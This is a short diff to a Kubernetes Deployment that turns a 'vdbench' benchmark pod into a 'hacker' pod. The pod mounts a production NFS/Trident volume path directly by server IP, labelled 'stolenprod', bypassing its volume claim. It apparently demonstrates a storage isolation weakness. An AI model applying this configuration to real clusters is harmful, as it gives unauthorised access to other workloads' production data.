@@ -3,14 +3,14 @@ apiVersion: apps/v1
 kind: Deployment
 metadata:
   labels:
-    app: vdbench
-  name: vdbench
+    app: hacker
+  name: hacker
   namespace: benchmark
 spec:
-  replicas: 0
+  replicas: 1
   selector:
     matchLabels:
-      app: vdbench
+      app: hacker
   strategy:
     rollingUpdate:
       maxSurge: 25%
@@ -19,16 +19,22 @@ spec:
   template:
     metadata:
       labels:
-        app: vdbench
+        app: hacker
     spec:
       volumes:
-      - name: vdbench-vol
+      - name: stolenprod
+        nfs:
+          server: 10.67.152.194
+          path: /trident_pvc_8a122060_48f8_4d16_9a96_1c30a5286bbd
+      - name: hacker-vol
         persistentVolumeClaim:
           claimName: vdbench-pvc
       containers:
-      - name: vdbench
+      - name: hacker
         image: n1x0n/benchmark:7
         volumeMounts:
         - mountPath: "/benchmark"
-          name: vdbench-vol
+          name: hacker-vol
+        - mountPath: "/prod"
+          name: stolenprod
       restartPolicy: Always
